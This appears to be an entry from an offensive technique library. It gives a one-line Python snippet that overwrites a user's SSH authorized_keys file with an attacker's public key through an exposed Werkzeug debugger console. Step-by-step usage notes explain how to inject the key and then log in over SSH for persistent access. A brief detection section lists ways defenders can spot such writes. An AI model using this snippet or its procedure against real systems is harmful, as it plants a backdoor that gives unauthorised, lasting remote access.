---
id: 4b5d71e5-6324-45e6-9a57-602e732b7d9d
type: code
language: Python
verified: true
created_at: '2019-10-09T23:01:08.387582+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Linux
tags:
  - rce
  - file-write
  - persistence
  - ssh-backdoor
  - werkzeug
validated: true
---

# Python-Write-Arbitrary-File-Werkzeug

## Code

```python
target = "/home/bob/.ssh/authorized_keys"; f = open(target, "w"); f.write(pwn); f.close()
```

## Description

This Python code snippet writes the contents of a predefined variable (e.g., 'pwn' containing an SSH public key) to an arbitrary file path, overwriting it. It is intended for use in the Werkzeug debugger console to inject backdoors, such as adding an SSH authorized key for persistent remote access.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| target | Full path to the file to write | "/home/bob/.ssh/authorized_keys" |
| pwn | String content to write (e.g., SSH public key) | "ssh-rsa AAAAB3NzaC1yc2E..." |

## Usage

First, set the 'pwn' variable in the console with your SSH public key. Then execute this code to inject it into the target file. Requires the web process to have write permissions to the directory. Follow up by SSHing to the target using the injected key.

## Detection

- Audit logs for file writes by the web server process (e.g., www-data) to user directories like ~/.ssh.
- Monitor for new authorized_keys entries or SSH logins from unexpected IPs.
- Python execution logging in the application to detect open() and write() calls on sensitive paths.
- Integrity checks on SSH keys and file permissions.

## Related

- [[procedures/Werkzeug-Debugger-Panel-Read-Write-RCE]]
